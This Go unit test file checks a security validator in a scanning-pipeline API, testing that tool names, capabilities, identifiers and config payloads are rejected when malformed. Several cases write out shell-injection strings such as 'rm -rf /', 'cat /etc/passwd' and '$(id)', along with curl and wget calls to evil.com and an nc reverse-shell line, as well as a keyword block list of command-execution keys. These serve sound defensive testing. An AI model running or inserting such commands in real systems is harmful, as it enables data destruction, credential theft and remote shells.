package unit

import (
	"context"
	"encoding/json"
	"errors"
	"testing"

	"github.com/openctemio/api/internal/app"
	"github.com/openctemio/api/pkg/domain/shared"
	"github.com/openctemio/api/pkg/domain/tool"
	"github.com/openctemio/api/pkg/logger"
	"github.com/openctemio/api/pkg/pagination"
)

// =============================================================================
// Mock: secValMockToolRepo implements tool.Repository for SecurityValidator tests
// =============================================================================

type secValMockToolRepo struct {
	platformTools map[string]*tool.Tool // keyed by name
	tenantTools   map[string]*tool.Tool // keyed by name+tenantID
	capsErr       error
	extraCaps     []string
}

func newSecValMockToolRepo() *secValMockToolRepo {
	return &secValMockToolRepo{
		platformTools: make(map[string]*tool.Tool),
		tenantTools:   make(map[string]*tool.Tool),
	}
}

func (m *secValMockToolRepo) tenantKey(tenantID shared.ID, name string) string {
	return tenantID.String() + ":" + name
}

// AddPlatformTool registers a platform tool by name.
func (m *secValMockToolRepo) AddPlatformTool(t *tool.Tool) {
	m.platformTools[t.Name] = t
}

// AddTenantTool registers a tenant-specific tool.
func (m *secValMockToolRepo) AddTenantTool(tenantID shared.ID, t *tool.Tool) {
	m.tenantTools[m.tenantKey(tenantID, t.Name)] = t
}

func (m *secValMockToolRepo) GetByName(_ context.Context, name string) (*tool.Tool, error) {
	t, ok := m.platformTools[name]
	if !ok {
		return nil, shared.ErrNotFound
	}
	return t, nil
}

func (m *secValMockToolRepo) GetByTenantAndName(_ context.Context, tenantID shared.ID, name string) (*tool.Tool, error) {
	t, ok := m.tenantTools[m.tenantKey(tenantID, name)]
	if !ok {
		return nil, shared.ErrNotFound
	}
	return t, nil
}

func (m *secValMockToolRepo) GetAllCapabilities(_ context.Context) ([]string, error) {
	if m.capsErr != nil {
		return nil, m.capsErr
	}
	return m.extraCaps, nil
}

// --- Unused interface methods (required to satisfy tool.Repository) ---

func (m *secValMockToolRepo) Create(_ context.Context, _ *tool.Tool) error { return nil }
func (m *secValMockToolRepo) GetByID(_ context.Context, _ shared.ID) (*tool.Tool, error) {
	return nil, shared.ErrNotFound
}
func (m *secValMockToolRepo) List(_ context.Context, _ tool.ToolFilter, page pagination.Pagination) (pagination.Result[*tool.Tool], error) {
	return pagination.Result[*tool.Tool]{}, nil
}
func (m *secValMockToolRepo) ListByNames(_ context.Context, _ []string) ([]*tool.Tool, error) {
	return nil, nil
}
func (m *secValMockToolRepo) ListByCategoryID(_ context.Context, _ shared.ID) ([]*tool.Tool, error) {
	return nil, nil
}
func (m *secValMockToolRepo) ListByCategoryName(_ context.Context, _ string) ([]*tool.Tool, error) {
	return nil, nil
}
func (m *secValMockToolRepo) ListByCapability(_ context.Context, _ string) ([]*tool.Tool, error) {
	return nil, nil
}
func (m *secValMockToolRepo) FindByCapabilities(_ context.Context, _ shared.ID, _ []string) (*tool.Tool, error) {
	return nil, nil
}
func (m *secValMockToolRepo) Update(_ context.Context, _ *tool.Tool) error { return nil }
func (m *secValMockToolRepo) Delete(_ context.Context, _ shared.ID) error  { return nil }
func (m *secValMockToolRepo) GetByTenantAndID(_ context.Context, _, _ shared.ID) (*tool.Tool, error) {
	return nil, shared.ErrNotFound
}
func (m *secValMockToolRepo) GetPlatformToolByName(_ context.Context, _ string) (*tool.Tool, error) {
	return nil, shared.ErrNotFound
}
func (m *secValMockToolRepo) ListPlatformTools(_ context.Context, _ tool.ToolFilter, page pagination.Pagination) (pagination.Result[*tool.Tool], error) {
	return pagination.Result[*tool.Tool]{}, nil
}
func (m *secValMockToolRepo) ListTenantCustomTools(_ context.Context, _ shared.ID, _ tool.ToolFilter, page pagination.Pagination) (pagination.Result[*tool.Tool], error) {
	return pagination.Result[*tool.Tool]{}, nil
}
func (m *secValMockToolRepo) ListAvailableTools(_ context.Context, _ shared.ID, _ tool.ToolFilter, page pagination.Pagination) (pagination.Result[*tool.Tool], error) {
	return pagination.Result[*tool.Tool]{}, nil
}
func (m *secValMockToolRepo) DeleteTenantTool(_ context.Context, _, _ shared.ID) error { return nil }
func (m *secValMockToolRepo) BulkCreate(_ context.Context, _ []*tool.Tool) error        { return nil }
func (m *secValMockToolRepo) BulkUpdateVersions(_ context.Context, _ map[shared.ID]tool.VersionInfo) error {
	return nil
}
func (m *secValMockToolRepo) Count(_ context.Context, _ tool.ToolFilter) (int64, error) {
	return 0, nil
}

// =============================================================================
// Helpers
// =============================================================================

// newSecValValidator builds a SecurityValidator backed by the given mock repo.
// It bypasses the goroutine launched by NewSecurityValidator so that tests are
// deterministic. We call NewSecurityValidator and then let the background
// refresh finish; because our mock returns immediately, this is safe.
func newSecValValidator(repo *secValMockToolRepo) *app.SecurityValidator {
	log := logger.NewNop()
	return app.NewSecurityValidator(repo, log)
}

// makeActivePlatformTool creates an active platform tool with the given
// capabilities and stores it in the mock repo.
func makeActivePlatformTool(repo *secValMockToolRepo, name string, caps []string) *tool.Tool {
	t, _ := tool.NewTool(name, name, nil, tool.InstallBinary)
	t.IsActive = true
	t.Capabilities = caps
	repo.AddPlatformTool(t)
	return t
}

// makeInactivePlatformTool is like makeActivePlatformTool but IsActive=false.
func makeInactivePlatformTool(repo *secValMockToolRepo, name string) *tool.Tool {
	t, _ := tool.NewTool(name, name, nil, tool.InstallBinary)
	t.IsActive = false
	repo.AddPlatformTool(t)
	return t
}

// makeTenantTool creates an active tenant-specific tool.
func makeTenantTool(repo *secValMockToolRepo, tenantID shared.ID, name string, caps []string) *tool.Tool {
	t, _ := tool.NewTool(name, name, nil, tool.InstallBinary)
	t.IsActive = true
	t.Capabilities = caps
	repo.AddTenantTool(tenantID, t)
	return t
}

// hasCode returns true if result contains at least one error with the given code.
func hasCode(result *app.ValidationResult, code string) bool {
	for _, e := range result.Errors {
		if e.Code == code {
			return true
		}
	}
	return false
}

// =============================================================================
// Tests: ValidateStepConfig
// =============================================================================

func TestSecValValidateStepConfig_ValidToolAndCapabilities(t *testing.T) {
	repo := newSecValMockToolRepo()
	makeActivePlatformTool(repo, "nuclei", []string{"web", "network"})
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"nuclei",
		[]string{"web"},
		map[string]any{"timeout": "30s"},
	)

	if !result.Valid {
		t.Fatalf("expected valid result, got errors: %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_EmptyToolName_NoToolError(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// Empty tool name → skip tool validation entirely, only validate caps and config
	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		[]string{"scan"},
		map[string]any{"rate": "10"},
	)

	if !result.Valid {
		t.Fatalf("expected valid result with empty tool name, got errors: %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_ToolNotFound(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"nonexistent-tool",
		nil,
		nil,
	)

	if result.Valid {
		t.Fatal("expected invalid result for unknown tool")
	}
	if !hasCode(result, "INVALID_TOOL") {
		t.Errorf("expected INVALID_TOOL error code, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_ToolInactive(t *testing.T) {
	repo := newSecValMockToolRepo()
	makeInactivePlatformTool(repo, "old-scanner")
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"old-scanner",
		nil,
		nil,
	)

	if result.Valid {
		t.Fatal("expected invalid result for inactive tool")
	}
	if !hasCode(result, "INVALID_TOOL") {
		t.Errorf("expected INVALID_TOOL error code, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_ToolNameInvalidChars(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	invalidNames := []string{
		"tool name",  // space
		"tool@name",  // @
		"tool/name",  // slash
		"tool;name",  // semicolon
		"tool$name",  // dollar
		"tôöl",       // accented chars
		"a b",        // space
	}

	for _, name := range invalidNames {
		t.Run(name, func(t *testing.T) {
			result := sv.ValidateStepConfig(
				context.Background(),
				shared.NewID(),
				name,
				nil,
				nil,
			)
			if result.Valid {
				t.Errorf("expected invalid result for tool name %q", name)
			}
		})
	}
}

func TestSecValValidateStepConfig_ToolNameTooLong(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	longName := "a"
	for i := 0; i < 51; i++ {
		longName += "b"
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		longName,
		nil,
		nil,
	)

	if result.Valid {
		t.Fatal("expected invalid result for tool name exceeding 50 chars")
	}
	if !hasCode(result, "INVALID_TOOL") {
		t.Errorf("expected INVALID_TOOL error, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_InvalidCapability(t *testing.T) {
	repo := newSecValMockToolRepo()
	makeActivePlatformTool(repo, "nuclei", []string{"web"})
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"nuclei",
		[]string{"totally-made-up-capability-xyz"},
		nil,
	)

	if result.Valid {
		t.Fatal("expected invalid result for unknown capability")
	}
	if !hasCode(result, "INVALID_CAPABILITY") {
		t.Errorf("expected INVALID_CAPABILITY error, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_CapabilityNotSupportedByTool(t *testing.T) {
	repo := newSecValMockToolRepo()
	// Tool only supports "web", not "network"
	makeActivePlatformTool(repo, "nuclei", []string{"web"})
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"nuclei",
		[]string{"network"}, // "network" is a valid global capability but not in this tool
		nil,
	)

	if result.Valid {
		t.Fatal("expected invalid result when capability doesn't match tool")
	}
	if !hasCode(result, "CAPABILITY_TOOL_MISMATCH") {
		t.Errorf("expected CAPABILITY_TOOL_MISMATCH error, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_CapabilityMatchesToolCaseInsensitive(t *testing.T) {
	repo := newSecValMockToolRepo()
	makeActivePlatformTool(repo, "nuclei", []string{"WEB"}) // tool caps in uppercase
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"nuclei",
		[]string{"web"}, // lowercase from caller
		nil,
	)

	// "WEB" stored in tool normalises to "web" in validator → should match
	if !result.Valid {
		t.Fatalf("expected valid result for case-insensitive capability match, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_DangerousConfigKey(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	dangerousKeys := []string{
		"command", "cmd", "exec", "execute", "shell", "bash", "sh",
		"script", "eval", "system", "popen", "subprocess", "spawn",
		"run_command", "os_command", "raw_command", "custom_command",
	}

	for _, key := range dangerousKeys {
		t.Run(key, func(t *testing.T) {
			config := map[string]any{key: "some-value"}
			result := sv.ValidateStepConfig(
				context.Background(),
				shared.NewID(),
				"",
				nil,
				config,
			)
			if result.Valid {
				t.Errorf("expected invalid result for dangerous config key %q", key)
			}
			if !hasCode(result, "DANGEROUS_CONFIG_KEY") {
				t.Errorf("expected DANGEROUS_CONFIG_KEY error for key %q, got %v", key, result.Errors)
			}
		})
	}
}

func TestSecValValidateStepConfig_DangerousKeySubstring(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// Keys that contain a dangerous word as a substring should also be blocked
	subKeys := []string{"my_command", "pre_exec_hook", "custom_shell_wrapper"}
	for _, key := range subKeys {
		t.Run(key, func(t *testing.T) {
			result := sv.ValidateStepConfig(
				context.Background(),
				shared.NewID(),
				"",
				nil,
				map[string]any{key: "value"},
			)
			if result.Valid {
				t.Errorf("expected invalid result for key containing dangerous substring: %q", key)
			}
		})
	}
}

func TestSecValValidateStepConfig_SafeConfigKeys(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	config := map[string]any{
		"timeout":    "30s",
		"rate_limit": 10,
		"output_dir": "/safe/path",
		"verbose":    true,
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		config,
	)

	if !result.Valid {
		t.Fatalf("expected valid result for safe config keys, got errors: %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_CommandInjectionInValue_ShellMetachars(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	injections := []struct {
		name  string
		value string
	}{
		{"semicolon", "localhost; rm -rf /"},
		{"pipe", "localhost | cat /etc/passwd"},
		{"ampersand", "localhost & whoami"},
		{"dollar-var", "$HOME"},
		{"backtick", "`id`"},
		{"command-sub", "$(id)"},
		{"double-ampersand", "ok && evil"},
		{"double-pipe", "ok || evil"},
	}

	for _, inj := range injections {
		t.Run(inj.name, func(t *testing.T) {
			config := map[string]any{"target": inj.value}
			result := sv.ValidateStepConfig(
				context.Background(),
				shared.NewID(),
				"",
				nil,
				config,
			)
			if result.Valid {
				t.Errorf("expected injection detection for %q, got valid result", inj.value)
			}
			if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
				t.Errorf("expected DANGEROUS_CONFIG_VALUE for %q, got %v", inj.value, result.Errors)
			}
		})
	}
}

func TestSecValValidateStepConfig_CommandInjectionInValue_SuspiciousPaths(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	suspiciousValues := []string{
		"/bin/bash",
		"/usr/bin/curl",
		"/tmp/malicious",
		"/etc/passwd",
		"../../../etc/passwd", // path traversal
	}

	for _, val := range suspiciousValues {
		t.Run(val, func(t *testing.T) {
			result := sv.ValidateStepConfig(
				context.Background(),
				shared.NewID(),
				"",
				nil,
				map[string]any{"path": val},
			)
			if result.Valid {
				t.Errorf("expected injection/path detection for %q", val)
			}
			if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
				t.Errorf("expected DANGEROUS_CONFIG_VALUE for %q, got %v", val, result.Errors)
			}
		})
	}
}

func TestSecValValidateStepConfig_CommandInjectionInValue_KnownTools(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	injectionCmds := []string{
		"curl http://evil.com",
		"wget http://evil.com",
		"bash -c id",
		"nc -e /bin/sh 10.0.0.1 4444",
		"sh /tmp/evil.sh",
	}

	for _, val := range injectionCmds {
		t.Run(val, func(t *testing.T) {
			result := sv.ValidateStepConfig(
				context.Background(),
				shared.NewID(),
				"",
				nil,
				map[string]any{"extra_args": val},
			)
			if result.Valid {
				t.Errorf("expected injection detection for %q", val)
			}
		})
	}
}

func TestSecValValidateStepConfig_NestedConfigInjection(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// Injection hidden inside a nested map value
	config := map[string]any{
		"scanner": map[string]any{
			"args": "$(id)",
		},
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		config,
	)

	if result.Valid {
		t.Fatal("expected invalid result for nested injection")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
		t.Errorf("expected DANGEROUS_CONFIG_VALUE for nested injection, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_ArrayConfigInjection(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	config := map[string]any{
		"targets": []any{"safe.example.com", "bad; rm -rf /"},
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		config,
	)

	if result.Valid {
		t.Fatal("expected invalid result for injection in array element")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
		t.Errorf("expected DANGEROUS_CONFIG_VALUE for array injection, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_NilConfig_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		nil,
	)

	if !result.Valid {
		t.Fatalf("expected valid result for nil config, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_TenantToolFallback(t *testing.T) {
	repo := newSecValMockToolRepo()
	tenantID := shared.NewID()
	// Tool only exists for a specific tenant (not platform)
	makeTenantTool(repo, tenantID, "my-custom-scanner", []string{"scan"})
	sv := newSecValValidator(repo)

	result := sv.ValidateStepConfig(
		context.Background(),
		tenantID,
		"my-custom-scanner",
		[]string{"scan"},
		nil,
	)

	if !result.Valid {
		t.Fatalf("expected valid for tenant tool fallback, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_TenantToolNotAccessibleByOtherTenant(t *testing.T) {
	repo := newSecValMockToolRepo()
	tenant1 := shared.NewID()
	tenant2 := shared.NewID()
	makeTenantTool(repo, tenant1, "tenant1-tool", []string{"scan"})
	sv := newSecValValidator(repo)

	// tenant2 trying to use tenant1's tool
	result := sv.ValidateStepConfig(
		context.Background(),
		tenant2,
		"tenant1-tool",
		nil,
		nil,
	)

	if result.Valid {
		t.Fatal("expected invalid result when accessing another tenant's tool")
	}
	if !hasCode(result, "INVALID_TOOL") {
		t.Errorf("expected INVALID_TOOL error, got %v", result.Errors)
	}
}

// =============================================================================
// Tests: ValidateScannerConfig
// =============================================================================

func TestSecValValidateScannerConfig_NilConfig_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateScannerConfig(context.Background(), shared.NewID(), nil)

	if !result.Valid {
		t.Fatalf("expected valid for nil scanner config, got %v", result.Errors)
	}
}

func TestSecValValidateScannerConfig_SafeConfig_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	config := map[string]any{
		"rate_limit": 100,
		"threads":    5,
		"timeout":    "30s",
	}

	result := sv.ValidateScannerConfig(context.Background(), shared.NewID(), config)

	if !result.Valid {
		t.Fatalf("expected valid scanner config, got %v", result.Errors)
	}
}

func TestSecValValidateScannerConfig_DangerousKey(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	config := map[string]any{
		"exec": "/usr/bin/id",
	}

	result := sv.ValidateScannerConfig(context.Background(), shared.NewID(), config)

	if result.Valid {
		t.Fatal("expected invalid result for dangerous key in scanner config")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_KEY") {
		t.Errorf("expected DANGEROUS_CONFIG_KEY, got %v", result.Errors)
	}
}

func TestSecValValidateScannerConfig_InjectionInValue(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	config := map[string]any{
		"extra": "ok; curl http://evil.com",
	}

	result := sv.ValidateScannerConfig(context.Background(), shared.NewID(), config)

	if result.Valid {
		t.Fatal("expected invalid result for injection in scanner config value")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
		t.Errorf("expected DANGEROUS_CONFIG_VALUE, got %v", result.Errors)
	}
}

// =============================================================================
// Tests: ValidateCommandPayload
// =============================================================================

func TestSecValValidateCommandPayload_ValidPayload(t *testing.T) {
	repo := newSecValMockToolRepo()
	makeActivePlatformTool(repo, "nuclei", []string{"web"})
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id": "run-001",
		"step_run_id":     "step-run-001",
		"step_id":         "step-001",
		"preferred_tool":  "nuclei",
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if !result.Valid {
		t.Fatalf("expected valid payload, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_MissingRequiredFields(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	tests := []struct {
		name        string
		payload     map[string]any
		missingCode string
	}{
		{
			name:    "missing pipeline_run_id",
			payload: map[string]any{"step_run_id": "sr1", "step_id": "s1"},
		},
		{
			name:    "missing step_run_id",
			payload: map[string]any{"pipeline_run_id": "pr1", "step_id": "s1"},
		},
		{
			name:    "missing step_id",
			payload: map[string]any{"pipeline_run_id": "pr1", "step_run_id": "sr1"},
		},
		{
			name:    "all missing",
			payload: map[string]any{},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), tc.payload)
			if result.Valid {
				t.Error("expected invalid result for missing required fields")
			}
			if !hasCode(result, "MISSING_FIELD") {
				t.Errorf("expected MISSING_FIELD error, got %v", result.Errors)
			}
		})
	}
}

func TestSecValValidateCommandPayload_DangerousStepConfig(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id": "pr1",
		"step_run_id":     "sr1",
		"step_id":         "s1",
		"step_config": map[string]any{
			"bash": "id",
		},
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if result.Valid {
		t.Fatal("expected invalid result for dangerous key in step_config")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_KEY") {
		t.Errorf("expected DANGEROUS_CONFIG_KEY, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_InjectionInStepConfig(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id": "pr1",
		"step_run_id":     "sr1",
		"step_id":         "s1",
		"step_config": map[string]any{
			"target": "host; cat /etc/passwd",
		},
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if result.Valid {
		t.Fatal("expected invalid result for injection in step_config value")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
		t.Errorf("expected DANGEROUS_CONFIG_VALUE, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_InvalidPreferredTool(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id": "pr1",
		"step_run_id":     "sr1",
		"step_id":         "s1",
		"preferred_tool":  "nonexistent-tool-xyz",
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if result.Valid {
		t.Fatal("expected invalid result for unknown preferred_tool")
	}
	if !hasCode(result, "INVALID_TOOL") {
		t.Errorf("expected INVALID_TOOL, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_InvalidPreferredToolFormat(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id": "pr1",
		"step_run_id":     "sr1",
		"step_id":         "s1",
		"preferred_tool":  "tool with spaces; rm -rf /",
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if result.Valid {
		t.Fatal("expected invalid result for malicious preferred_tool")
	}
	if !hasCode(result, "INVALID_TOOL") {
		t.Errorf("expected INVALID_TOOL, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_EmptyPreferredTool_Skipped(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id": "pr1",
		"step_run_id":     "sr1",
		"step_id":         "s1",
		"preferred_tool":  "", // empty → should skip validation
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if !result.Valid {
		t.Fatalf("expected valid when preferred_tool is empty, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_ValidRequiredCapabilities(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id":       "pr1",
		"step_run_id":           "sr1",
		"step_id":               "s1",
		"required_capabilities": []string{"scan", "web"},
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if !result.Valid {
		t.Fatalf("expected valid for known capabilities, got %v", result.Errors)
	}
}

func TestSecValValidateCommandPayload_InvalidRequiredCapabilities(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	payload := map[string]any{
		"pipeline_run_id":       "pr1",
		"step_run_id":           "sr1",
		"step_id":               "s1",
		"required_capabilities": []string{"scan", "totally-unknown-xyz"},
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if result.Valid {
		t.Fatal("expected invalid for unknown required_capabilities")
	}
	if !hasCode(result, "INVALID_CAPABILITY") {
		t.Errorf("expected INVALID_CAPABILITY, got %v", result.Errors)
	}
}

// =============================================================================
// Tests: ValidateIdentifier
// =============================================================================

func TestSecValValidateIdentifier_ValidNames(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	validNames := []string{
		"step-key",
		"step_key",
		"StepKey",
		"step123",
		"STEP",
		"a",
		"step-key_01",
		"ABC-xyz_123",
	}

	for _, name := range validNames {
		t.Run(name, func(t *testing.T) {
			result := sv.ValidateIdentifier(name, 100, "step_key")
			if !result.Valid {
				t.Errorf("expected %q to be valid, got %v", name, result.Errors)
			}
		})
	}
}

func TestSecValValidateIdentifier_Empty(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateIdentifier("", 100, "step_key")

	if result.Valid {
		t.Fatal("expected invalid for empty identifier")
	}
	if !hasCode(result, "EMPTY_IDENTIFIER") {
		t.Errorf("expected EMPTY_IDENTIFIER, got %v", result.Errors)
	}
}

func TestSecValValidateIdentifier_TooLong(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	name := "abcdefghij" // 10 chars
	result := sv.ValidateIdentifier(name, 5, "tag")

	if result.Valid {
		t.Fatal("expected invalid for identifier exceeding maxLen")
	}
	if !hasCode(result, "IDENTIFIER_TOO_LONG") {
		t.Errorf("expected IDENTIFIER_TOO_LONG, got %v", result.Errors)
	}
}

func TestSecValValidateIdentifier_MaxLenZeroMeansNoLimit(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	longName := "abcdefghijklmnopqrstuvwxyz-abcdefghijklmnopqrstuvwxyz"
	result := sv.ValidateIdentifier(longName, 0, "tag")

	if !result.Valid {
		t.Fatalf("expected valid when maxLen=0 (no limit), got %v", result.Errors)
	}
}

func TestSecValValidateIdentifier_InvalidChars(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	invalidNames := []string{
		"step key",    // space
		"step@key",   // @
		"step/key",   // slash
		"step.key",   // dot
		"step;key",   // semicolon
		"step$key",   // dollar
		"stép",       // accented char
	}

	for _, name := range invalidNames {
		t.Run(name, func(t *testing.T) {
			result := sv.ValidateIdentifier(name, 100, "identifier")
			if result.Valid {
				t.Errorf("expected %q to be invalid", name)
			}
			if !hasCode(result, "INVALID_IDENTIFIER_FORMAT") {
				t.Errorf("expected INVALID_IDENTIFIER_FORMAT for %q, got %v", name, result.Errors)
			}
		})
	}
}

func TestSecValValidateIdentifier_ExactlyAtMaxLen_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	name := "abcde" // exactly 5 chars
	result := sv.ValidateIdentifier(name, 5, "tag")

	if !result.Valid {
		t.Fatalf("expected valid at exactly maxLen, got %v", result.Errors)
	}
}

func TestSecValValidateIdentifier_FieldNameInError(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateIdentifier("", 100, "my_field_name")

	if result.Valid {
		t.Fatal("expected invalid result")
	}
	if len(result.Errors) == 0 {
		t.Fatal("expected at least one error")
	}
	if result.Errors[0].Field != "my_field_name" {
		t.Errorf("expected field name 'my_field_name', got %q", result.Errors[0].Field)
	}
}

// =============================================================================
// Tests: ValidateIdentifiers (slice)
// =============================================================================

func TestSecValValidateIdentifiers_AllValid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	names := []string{"tag-one", "tag_two", "TagThree"}
	result := sv.ValidateIdentifiers(names, 50, "tags")

	if !result.Valid {
		t.Fatalf("expected valid for all valid identifiers, got %v", result.Errors)
	}
}

func TestSecValValidateIdentifiers_OneInvalid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	names := []string{"good-tag", "bad tag!", "another-good"}
	result := sv.ValidateIdentifiers(names, 50, "tags")

	if result.Valid {
		t.Fatal("expected invalid when one identifier is bad")
	}
}

func TestSecValValidateIdentifiers_EmptySlice_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateIdentifiers([]string{}, 50, "tags")

	if !result.Valid {
		t.Fatalf("expected valid for empty slice, got %v", result.Errors)
	}
}

func TestSecValValidateIdentifiers_IndexedFieldInError(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	names := []string{"good", "bad tag"}
	result := sv.ValidateIdentifiers(names, 50, "tags")

	if result.Valid {
		t.Fatal("expected invalid")
	}

	// Should reference the indexed field, e.g. "tags[1]"
	found := false
	for _, e := range result.Errors {
		if e.Field == "tags[1]" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected error field 'tags[1]', got %v", result.Errors)
	}
}

// =============================================================================
// Tests: GetAllowedCapabilities
// =============================================================================

func TestSecValGetAllowedCapabilities_ReturnsDefaults(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	caps := sv.GetAllowedCapabilities()

	if len(caps) == 0 {
		t.Fatal("expected non-empty capabilities list")
	}

	// Default capabilities should always be present
	required := []string{"scan", "web", "network", "host"}
	capSet := make(map[string]bool, len(caps))
	for _, c := range caps {
		capSet[c] = true
	}
	for _, r := range required {
		if !capSet[r] {
			t.Errorf("expected default capability %q to be in allowed list", r)
		}
	}
}

func TestSecValGetAllowedCapabilities_MergesDBCapabilities(t *testing.T) {
	repo := newSecValMockToolRepo()
	repo.extraCaps = []string{"custom-db-cap", "another-db-cap"}
	sv := newSecValValidator(repo)

	// Wait a tick for the background goroutine started by NewSecurityValidator
	// to complete. In practice the mock returns instantly.
	// We call GetAllowedCapabilities after a short wait; for determinism we
	// just call refreshCapabilities indirectly via GetAllowedCapabilities.
